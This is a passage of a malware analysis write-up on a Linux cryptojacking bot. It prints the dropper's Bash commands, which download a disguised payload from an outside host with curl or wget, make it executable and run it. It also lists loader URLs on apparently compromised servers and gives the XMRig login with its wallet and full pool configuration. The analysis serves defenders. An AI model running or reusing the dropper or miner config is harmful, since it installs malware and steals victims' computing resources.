<p>Initial file dropped was a Bash file containing following commands:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">rm</span> <span class="nt">-f</span> /var/tmp/.sys.log
curl http://www.bizqsoft.com/imgtemplate/11.png <span class="nt">-o</span> /var/tmp/.sys.log <span class="o">||</span> wget http://www.bizqsoft.com/imgtemplate/11.png <span class="nt">-O</span> /var/tmp/.sys.log
<span class="nb">chmod </span>0777 /var/tmp/.sys.log
/var/tmp/.sys.log
</code></pre></div></div>

<p>File <code class="highlighter-rouge">11.png</code> was found packed using UPX packer. After the decompression, a list of websites has been found which is potentially has been compromised and used to host the loader for the bot.</p>

<div class="language-json highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">[</span><span class="w">
    </span><span class="s2">"http://www.ltj4949.com/weixin/loader.gif"</span><span class="p">,</span><span class="w">
    </span><span class="s2">"http://128.1.49.78/phpmyadmin/loader.gif"</span><span class="p">,</span><span class="w">
    </span><span class="s2">"http://111.231.230.124/data/loader.gif"</span><span class="p">,</span><span class="w">
    </span><span class="s2">"http://124.42.117.172/yjcm/loader.gif"</span><span class="p">,</span><span class="w">
    </span><span class="s2">"http://180.76.114.216/log/loader.gif"</span><span class="p">,</span><span class="w">
    </span><span class="s2">"http://103.17.95.45/log/loader.gif"</span><span class="p">,</span><span class="w">
    </span><span class="s2">"http://car.earthstudio.cn/static/img/loader.gif"</span><span class="p">,</span><span class="w">
    </span><span class="s2">"http://111.231.239.187/loader/loader.gif"</span><span class="p">,</span><span class="w">
    </span><span class="s2">"http://120.27.33.177:80/phpMyAdmin/locale/loader.gif"</span><span class="p">,</span><span class="w">
    </span><span class="s2">"http://120.55.53.187:80/website/e/data/loader.gif"</span><span class="p">,</span><span class="w">
    </span><span class="s2">"http://47.100.24.187:80/Mobile/data/loader.gif"</span><span class="p">,</span><span class="w">
    </span><span class="s2">"http://117.48.211.158:80/phpMyAdmin/locale/loader.gif"</span><span class="p">,</span><span class="w">
    </span><span class="s2">"http://47.97.217.130:80/heart_health/vendor/loader.gif"</span><span class="p">,</span><span class="w">
    </span><span class="s2">"http://132.148.151.76:80/phpMyAdmin/locale/loader.gif"</span><span class="p">,</span><span class="w">
    </span><span class="s2">"http://39.109.113.71/phpmyadmin/setup/loader.gif"</span><span class="w">
</span><span class="p">]</span><span class="w">
</span></code></pre></div></div>

<p>Further analysis shows that a miner is being fetched from any live domain from the list.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>GET /posp_test/uploads/x86.png HTTP/1.1
Host: 118.25.102.126
Accept: <span class="k">*</span>/<span class="k">*</span>
User-Agent: Mozilla/5.0 <span class="o">(</span>Windows<span class="p">;</span> U<span class="p">;</span> Windows NT 6.0<span class="p">;</span> en-US<span class="p">;</span> rv:1.8.1.7<span class="o">)</span> Gecko/20070914 Firefox/2.0.0.7
</code></pre></div></div>

<p><img src="x86.png" alt="x86_miner" /></p>

<p>XMRig miner credentials</p>

<div class="language-json highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">{</span><span class="w">
    </span><span class="s2">"id"</span><span class="p">:</span><span class="w"> </span><span class="mi">1</span><span class="p">,</span><span class="w">
    </span><span class="s2">"jsonrpc"</span><span class="p">:</span><span class="w"> </span><span class="s2">"2.0"</span><span class="p">,</span><span class="w">
    </span><span class="s2">"method"</span><span class="p">:</span><span class="w"> </span><span class="s2">"login"</span><span class="p">,</span><span class="w">
    </span><span class="s2">"params"</span><span class="p">:</span><span class="w"> </span><span class="p">{</span><span class="w">
        </span><span class="s2">"agent"</span><span class="p">:</span><span class="w"> </span><span class="s2">"XMRig/2.6.4 (Linux i686) libuv/1.19.3-dev gcc/7.2.0"</span><span class="p">,</span><span class="w">
        </span><span class="s2">"algo"</span><span class="p">:</span><span class="w"> </span><span class="p">[</span><span class="w">
            </span><span class="s2">"cn/1"</span><span class="p">,</span><span class="w">
            </span><span class="s2">"cn/0"</span><span class="p">,</span><span class="w">
            </span><span class="s2">"cn/xtl"</span><span class="p">,</span><span class="w">
            </span><span class="s2">"cn/msr"</span><span class="p">,</span><span class="w">
            </span><span class="s2">"cn/xao"</span><span class="p">,</span><span class="w">
            </span><span class="s2">"cn/rto"</span><span class="p">,</span><span class="w">
            </span><span class="s2">"cn"</span><span class="w">
        </span><span class="p">],</span><span class="w">
        </span><span class="s2">"login"</span><span class="p">:</span><span class="w"> </span><span class="s2">"4ACoKdxrH8QeqdY16p9djYF1C4CbX7FB34ECdJxw8CmLTS8DurirbQehgGUdQkLz1gP93ZH57iN6444NkCNW9w9i2UZkYqY"</span><span class="p">,</span><span class="w">
        </span><span class="s2">"pass"</span><span class="p">:</span><span class="w"> </span><span class="s2">"x"</span><span class="w">
    </span><span class="p">}</span><span class="w">
</span><span class="p">}</span><span class="w">
</span></code></pre></div></div>

<p>Below is the list of mining server being use by the miner:</p>

<div class="language-json highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">{</span><span class="w">
    </span><span class="s2">"algo"</span><span class="p">:</span><span class="w"> </span><span class="s2">"cryptonight"</span><span class="p">,</span><span class="w">
    </span><span class="s2">"api"</span><span class="p">:</span><span class="w"> </span><span class="p">{</span><span class="w">
        </span><span class="s2">"port"</span><span class="p">:</span><span class="w"> </span><span class="mi">0</span><span class="p">,</span><span class="w">
        </span><span class="s2">"access-token"</span><span class="p">:</span><span class="w"> </span><span class="kc">null</span><span class="p">,</span><span class="w">
        </span><span class="s2">"worker-id"</span><span class="p">:</span><span class="w"> </span><span class="kc">null</span><span class="p">,</span><span class="w">
        </span><span class="s2">"ipv6"</span><span class="p">:</span><span class="w"> </span><span class="kc">false</span><span class="p">,</span><span class="w">
        </span><span class="s2">"restricted"</span><span class="p">:</span><span class="w"> </span><span class="kc">true</span><span class="w">
    </span><span class="p">},</span><span class="w">
    </span><span class="s2">"av"</span><span class="p">:</span><span class="w"> </span><span class="mi">0</span><span class="p">,</span><span class="w">
    </span><span class="s2">"background"</span><span class="p">:</span><span class="w"> </span><span class="kc">false</span><span class="p">,</span><span class="w">
    </span><span class="s2">"colors"</span><span class="p">:</span><span class="w"> </span><span class="kc">true</span><span class="p">,</span><span class="w">
    </span><span class="s2">"cpu-affinity"</span><span class="p">:</span><span class="w"> </span><span class="kc">null</span><span class="p">,</span><span class="w">
    </span><span class="s2">"cpu-priority"</span><span class="p">:</span><span class="w"> </span><span class="kc">null</span><span class="p">,</span><span class="w">
    </span><span class="s2">"donate-level"</span><span class="p">:</span><span class="w"> </span><span class="mi">1</span><span class="p">,</span><span class="w">
    </span><span class="s2">"huge-pages"</span><span class="p">:</span><span class="w"> </span><span class="kc">true</span><span class="p">,</span><span class="w">
    </span><span class="s2">"hw-aes"</span><span class="p">:</span><span class="w"> </span><span class="kc">null</span><span class="p">,</span><span class="w">
    </span><span class="s2">"log-file"</span><span class="p">:</span><span class="w"> </span><span class="kc">null</span><span class="p">,</span><span class="w">
    </span><span class="s2">"max-cpu-usage"</span><span class="p">:</span><span class="w"> </span><span class="mi">75</span><span class="p">,</span><span class="w">
    </span><span class="s2">"pools"</span><span class="p">:</span><span class="w"> </span><span class="p">[</span><span class="w">
        </span><span class="p">{</span><span class="w">
            </span><span class="s2">"url"</span><span class="p">:</span><span class="w"> </span><span class="s2">"sg.minexmr.com:4444"</span><span class="p">,</span><span class="w">
            </span><span class="s2">"user"</span><span class="p">:</span><span class="w"> </span><span class="s2">"4ACoKdxrH8QeqdY16p9djYF1C4CbX7FB34ECdJxw8CmLTS8DurirbQehgGUdQkLz1gP93ZH57iN6444NkCNW9w9i2UZkYqY"</span><span class="p">,</span><span class="w">
            </span><span class="s2">"pass"</span><span class="p">:</span><span class="w"> </span><span class="s2">"x"</span><span class="p">,</span><span class="w">
            </span><span class="s2">"rig-id"</span><span class="p">:</span><span class="w"> </span><span class="kc">null</span><span class="p">,</span><span class="w">
            </span><span class="s2">"nicehash"</span><span class="p">:</span><span class="w"> </span><span class="kc">false</span><span class="p">,</span><span class="w">
            </span><span class="s2">"keepalive"</span><span class="p">:</span><span class="w"> </span><span class="kc">false</span><span class="p">,</span><span class="w">
            </span><span class="s2">"variant"</span><span class="p">:</span><span class="w"> </span><span class="mi">1</span><span class="w">
        </span><span class="p">},</span><span class="w">
        </span><span class="p">{</span><span class="w">
            </span><span class="s2">"url"</span><span class="p">:</span><span class="w"> </span><span class="s2">"sg.minexmr.com:80"</span><span class="p">,</span><span class="w">
            </span><span class="s2">"user"</span><span class="p">:</span><span class="w"> </span><span class="s2">"4ACoKdxrH8QeqdY16p9djYF1C4CbX7FB34ECdJxw8CmLTS8DurirbQehgGUdQkLz1gP93ZH57iN6444NkCNW9w9i2UZkYqY"</span><span class="p">,</span><span class="w">
            </span><span class="s2">"pass"</span><span class="p">:</span><span class="w"> </span><span class="s2">"x"</span><span class="p">,</span><span class="w">
            </span><span class="s2">"rig-id"</span><span class="p">:</span><span class="w"> </span><span class="kc">null</span><span class="p">,</span><span class="w">
            </span><span class="s2">"nicehash"</span><span class="p">:</span><span class="w"> </span><span class="kc">false</span><span class="p">,</span><span class="w">
            </span><span class="s2">"keepalive"</span><span class="p">:</span><span class="w"> </span><span class="kc">false</span><span class="p">,</span><span class="w">
            </span><span class="s2">"variant"</span><span class="p">:</span><span class="w"> </span><span class="mi">1</span><span class="w">
        </span><span class="p">},</span><span class="w">
        </span><span class="p">{</span><span class="w">
            </span><span class="s2">"url"</span><span class="p">:</span><span class="w"> </span><span class="s2">"sg.minexmr.com:443"</span><span class="p">,</span><span class="w">
            </span><span class="s2">"user"</span><span class="p">:</span><span class="w"> </span><span class="s2">"4ACoKdxrH8QeqdY16p9djYF1C4CbX7FB34ECdJxw8CmLTS8DurirbQehgGUdQkLz1gP93ZH57iN6444NkCNW9w9i2UZkYqY"</span><span class="p">,</span><span class="w">
            </span><span class="s2">"pass"</span><span class="p">:</span><span class="w"> </span><span class="s2">"x"</span><span class="p">,</span><span class="w">
            </span><span class="s2">"rig-id"</span><span class="p">:</span><span class="w"> </span><span class="kc">null</span><span class="p">,</span><span class="w">
            </span><span class="s2">"nicehash"</span><span class="p">:</span><span class="w"> </span><span class="kc">false</span><span class="p">,</span><span class="w">
            </span><span class="s2">"keepalive"</span><span class="p">:</span><span class="w"> </span><span class="kc">false</span><span class="p">,</span><span class="w">
            </span><span class="s2">"variant"</span><span class="p">:</span><span class="w"> </span><span class="mi">1</span><span class="w">
        </span><span class="p">},</span><span class="w">
        </span><span class="p">{</span><span class="w">
            </span><span class="s2">"url"</span><span class="p">:</span><span class="w"> </span><span class="s2">"pool.minexmr.com:4444"</span><span class="p">,</span><span class="w">
            </span><span class="s2">"user"</span><span class="p">:</span><span class="w"> </span><span class="s2">"4ACoKdxrH8QeqdY16p9djYF1C4CbX7FB34ECdJxw8CmLTS8DurirbQehgGUdQkLz1gP93ZH57iN6444NkCNW9w9i2UZkYqY"</span><span class="p">,</span><span class="w">
            </span><span class="s2">"pass"</span><span class="p">:</span><span class="w"> </span><span class="s2">"x"</span><span class="p">,</span><span class="w">
            </span><span class="s2">"rig-id"</span><span class="p">:</span><span class="w"> </span><span class="kc">null</span><span class="p">,</span><span class="w">
            </span><span class="s2">"nicehash"</span><span class="p">:</span><span class="w"> </span><span class="kc">false</span><span class="p">,</span><span class="w">
            </span><span class="s2">"keepalive"</span><span class="p">:</span><span class="w"> </span><span class="kc">false</span><span class="p">,</span><span class="w">
            </span><span class="s2">"variant"</span><span class="p">:</span><span class="w"> </span><span class="mi">1</span><span class="w">
        </span><span class="p">},</span><span class="w">
        </span><span class="p">{</span><span class="w">
            </span><span class="s2">"url"</span><span class="p">:</span><span class="w"> </span><span class="s2">"pool.minexmr.com:80"</span><span class="p">,</span><span class="w">
            </span><span class="s2">"user"</span><span class="p">:</span><span class="w"> </span><span class="s2">"4ACoKdxrH8QeqdY16p9djYF1C4CbX7FB34ECdJxw8CmLTS8DurirbQehgGUdQkLz1gP93ZH57iN6444NkCNW9w9i2UZkYqY"</span><span class="p">,</span><span class="w">
            </span><span class="s2">"pass"</span><span class="p">:</span><span class="w"> </span><span class="s2">"x"</span><span class="p">,</span><span class="w">
            </span><span class="s2">"rig-id"</span><span class="p">:</span><span class="w"> </span><span class="kc">null</span><span class="p">,</span><span class="w">
            </span><span class="s2">"nicehash"</span><span class="p">:</span><span class="w"> </span><span class="kc">false</span><span class="p">,</span><span class="w">
            </span><span class="s2">"keepalive"</span><span class="p">:</span><span class="w"> </span><span class="kc">false</span><span class="p">,</span><span class="w">
            </span><span class="s2">"variant"</span><span class="p">:</span><span class="w"> </span><span class="mi">1</span><span class="w">
        </span><span class="p">},</span><span class="w">
        </span><span class="p">{</span><span class="w">
            </span><span class="s2">"url"</span><span class="p">:</span><span class="w"> </span><span class="s2">"pool.minexmr.com:443"</span><span class="p">,</span><span class="w">
            </span><span class="s2">"user"</span><span class="p">:</span><span class="w"> </span><span class="s2">"4ACoKdxrH8QeqdY16p9djYF1C4CbX7FB34ECdJxw8CmLTS8DurirbQehgGUdQkLz1gP93ZH57iN6444NkCNW9w9i2UZkYqY"</span><span class="p">,</span><span class="w">
            </span><span class="s2">"pass"</span><span class="p">:</span><span class="w"> </span><span class="s2">"x"</span><span class="p">,</span><span class="w">
            </span><span class="s2">"rig-id"</span><span class="p">:</span><span class="w"> </span><span class="kc">null</span><span class="p">,</span><span class="w">
            </span><span class="s2">"nicehash"</span><span class="p">:</span><span class="w"> </span><span class="kc">false</span><span class="p">,</span><span class="w">
            </span><span class="s2">"keepalive"</span><span class="p">:</span><span class="w"> </span><span class="kc">false</span><span class="p">,</span><span class="w">
            </span><span class="s2">"variant"</span><span class="p">:</span><span class="w"> </span><span class="mi">1</span><span class="w">
        </span><span class="p">},</span><span class="w">
        </span><span class="p">{</span><span class="w">
            </span><span class="s2">"url"</span><span class="p">:</span><span class="w"> </span><span class="s2">"xmr-usa.dwarfpool.com:8005 "</span><span class="p">,</span><span class="w">
            </span><span class="s2">"user"</span><span class="p">:</span><span class="w"> </span><span class="s2">"4ACoKdxrH8QeqdY16p9djYF1C4CbX7FB34ECdJxw8CmLTS8DurirbQehgGUdQkLz1gP93ZH57iN6444NkCNW9w9i2UZkYqY"</span><span class="p">,</span><span class="w">
            </span><span class="s2">"pass"</span><span class="p">:</span><span class="w"> </span><span class="s2">"x"</span><span class="p">,</span><span class="w">
            </span><span class="s2">"rig-id"</span><span class="p">:</span><span class="w"> </span><span class="kc">null</span><span class="p">,</span><span class="w">
            </span><span class="s2">"nicehash"</span><span class="p">:</span><span class="w"> </span><span class="kc">false</span><span class="p">,</span><span class="w">
            </span><span class="s2">"keepalive"</span><span class="p">:</span><span class="w"> </span><span class="kc">false</span><span class="p">,</span><span class="w">
            </span><span class="s2">"variant"</span><span class="p">:</span><span class="w"> </span><span class="mi">1</span><span class="w">
        </span><span class="p">},</span><span class="w">
        </span><span class="p">{</span><span class="w">
            </span><span class="s2">"url"</span><span class="p">:</span><span class="w"> </span><span class="s2">"xmr-usa.dwarfpool.com:8080"</span><span class="p">,</span><span class="w">
            </span><span class="s2">"user"</span><span class="p">:</span><span class="w"> </span><span class="s2">"4ACoKdxrH8QeqdY16p9djYF1C4CbX7FB34ECdJxw8CmLTS8DurirbQehgGUdQkLz1gP93ZH57iN6444NkCNW9w9i2UZkYqY"</span><span class="p">,</span><span class="w">
            </span><span class="s2">"pass"</span><span class="p">:</span><span class="w"> </span><span class="s2">"x"</span><span class="p">,</span><span class="w">
            </span><span class="s2">"rig-id"</span><span class="p">:</span><span class="w"> </span><span class="kc">null</span><span class="p">,</span><span class="w">
            </span><span class="s2">"nicehash"</span><span class="p">:</span><span class="w"> </span><span class="kc">false</span><span class="p">,</span><span class="w">
            </span><span class="s2">"keepalive"</span><span class="p">:</span><span class="w"> </span><span class="kc">false</span><span class="p">,</span><span class="w">
            </span><span class="s2">"variant"</span><span class="p">:</span><span class="w"> </span><span class="mi">1</span><span class="w">
        </span><span class="p">},</span><span class="w">
        </span><span class="p">{</span><span class="w">
            </span><span class="s2">"url"</span><span class="p">:</span><span class="w"> </span><span class="s2">"pool.monero.hashvault.pro:443"</span><span class="p">,</span><span class="w">
            </span><span class="s2">"user"</span><span class="p">:</span><span class="w"> </span><span class="s2">"4ACoKdxrH8QeqdY16p9djYF1C4CbX7FB34ECdJxw8CmLTS8DurirbQehgGUdQkLz1gP93ZH57iN6444NkCNW9w9i2UZkYqY"</span><span class="p">,</span><span class="w">
            </span><span class="s2">"pass"</span><span class="p">:</span><span class="w"> </span><span class="s2">"x"</span><span class="p">,</span><span class="w">
            </span><span class="s2">"rig-id"</span><span class="p">:</span><span class="w"> </span><span class="kc">null</span><span class="p">,</span><span class="w">
            </span><span class="s2">"nicehash"</span><span class="p">:</span><span class="w"> </span><span class="kc">false</span><span class="p">,</span><span class="w">
            </span><span class="s2">"keepalive"</span><span class="p">:</span><span class="w"> </span><span class="kc">false</span><span class="p">,</span><span class="w">
            </span><span class="s2">"variant"</span><span class="p">:</span><span class="w"> </span><span class="mi">1</span><span class="w">
        </span><span class="p">},</span><span class="w">
        </span><span class="p">{</span><span class="w">
            </span><span class="s2">"url"</span><span class="p">:</span><span class="w"> </span><span class="s2">"pool.monero.hashvault.pro:443"</span><span class="p">,</span><span class="w">
            </span><span class="s2">"user"</span><span class="p">:</span><span class="w"> </span><span class="s2">"4ACoKdxrH8QeqdY16p9djYF1C4CbX7FB34ECdJxw8CmLTS8DurirbQehgGUdQkLz1gP93ZH57iN6444NkCNW9w9i2UZkYqY"</span><span class="p">,</span><span class="w">
            </span><span class="s2">"pass"</span><span class="p">:</span><span class="w"> </span><span class="s2">"x"</span><span class="p">,</span><span class="w">
            </span><span class="s2">"rig-id"</span><span class="p">:</span><span class="w"> </span><span class="kc">null</span><span class="p">,</span><span class="w">
            </span><span class="s2">"nicehash"</span><span class="p">:</span><span class="w"> </span><span class="kc">false</span><span class="p">,</span><span class="w">
            </span><span class="s2">"keepalive"</span><span class="p">:</span><span class="w"> </span><span class="kc">false</span><span class="p">,</span><span class="w">
            </span><span class="s2">"variant"</span><span class="p">:</span><span class="w"> </span><span class="mi">1</span><span class="w">
        </span><span class="p">}</span><span class="w">
    </span><span class="p">],</span><span class="w">
    </span><span class="s2">"print-time"</span><span class="p">:</span><span class="w"> </span><span class="mi">600</span><span class="p">,</span><span class="w">
    </span><span class="s2">"retries"</span><span class="p">:</span><span class="w"> </span><span class="mi">3</span><span class="p">,</span><span class="w">
    </span><span class="s2">"retry-pause"</span><span class="p">:</span><span class="w"> </span><span class="mi">3</span><span class="p">,</span><span class="w">
    </span><span class="s2">"safe"</span><span class="p">:</span><span class="w"> </span><span class="kc">false</span><span class="p">,</span><span class="w">
    </span><span class="s2">"threads"</span><span class="p">:</span><span class="w"> </span><span class="kc">null</span><span class="p">,</span><span class="w">
    </span><span class="s2">"user-agent"</span><span class="p">:</span><span class="w"> </span><span class="kc">null</span><span class="p">,</span><span class="w">
    </span><span class="s2">"watch"</span><span class="p">:</span><span class="w"> </span><span class="kc">false</span><span class="w">
</span><span class="p">}</span><span class="w">
</span></code></pre></div></div>
<p><br /></p>
